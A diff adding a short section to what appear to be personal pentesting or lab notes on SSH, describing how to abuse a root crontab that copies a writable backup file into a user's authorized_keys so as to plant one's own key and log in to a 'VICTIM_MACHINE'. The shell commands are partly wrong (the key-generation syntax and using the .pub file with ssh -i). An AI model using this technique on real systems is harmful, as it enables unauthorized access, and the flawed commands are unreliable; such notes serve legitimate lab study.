@@ -73,3 +73,25 @@ Host *
 ![](Pasted%20image%2020240220233429.png)
 
 ![](Pasted%20image%2020240220233613.png)
+
+## Adding your public key to connect remotely without password
+
+If you find a crontab that for examples realizes a backup of a public key of a current user like: `*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys` and you can modify the file which is being backed up, you can add your public key:
+
+- Create a public key dedicated:
+	- `ssh-keygen rsa`
+	- Select a location (I prefer to create a separate public key)
+	- Add a passphrase
+- Now modify the content of the original backup by your `.pub` file you've just created:
+
+```shell
+echo "YOUR .PUB FILE BLABLABLA" > /opt/.backups/jake_id_rsa.pub.backup
+```
+
+- Now connect by using:
+
+```shell
+ssh -i file.pub USER@VICTIM_MACHINE
+```
+
+
